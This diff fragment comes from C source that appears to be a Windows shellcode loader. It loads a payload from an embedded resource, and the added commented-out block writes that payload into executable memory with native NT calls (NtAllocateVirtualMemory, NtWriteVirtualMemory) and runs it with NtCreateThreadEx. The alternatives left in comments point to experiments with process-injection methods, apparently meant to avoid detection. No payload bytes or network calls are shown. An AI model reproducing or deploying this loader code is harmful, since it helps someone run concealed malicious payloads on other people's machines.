@@ -352,6 +352,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 		payload1_len = SizeofResource(NULL, res);
 		
 		// Allocate some memory buffer for payload
+
+		
 		exec_mem = VirtualAlloc(0, payload1_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
 
@@ -382,6 +384,32 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 			return 0;
 		}
 		*/
+		/*
+		LPVOID pRemoteCode = NULL;
+		HANDLE hThread = NULL;
+		BOOL bStatus = FALSE;
+		HANDLE curProc = GetCurrentProcess();
+
+
+		NtAllocateVirtualMemory(curProc, &pRemoteCode, 0, (PSIZE_T)&payload1_len, MEM_COMMIT, PAGE_EXECUTE_READ);
+		//pRemoteCode = pVirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
+
+		//if (!pWriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T*)NULL)) {
+		if (!NtWriteVirtualMemory(curProc, pRemoteCode, payload1, payload1_len, NULL)) {
+			return FALSE;
+		}
+
+		//bStatus = pRtlCreateUserThread(hProc, NULL, FALSE, 0, 0, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, &hThread, NULL);
+		bStatus = NtCreateThreadEx(&hThread, 0x1FFFFF, NULL, curProc, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, FALSE, NULL, NULL, NULL, NULL);
+		if (bStatus != FALSE) {
+			WaitForSingleObject(hThread, -1);
+			CloseHandle(hThread);
+			return 0;
+		}
+		else
+			return FALSE;
+		*/
+
 
 		//return 0;
 
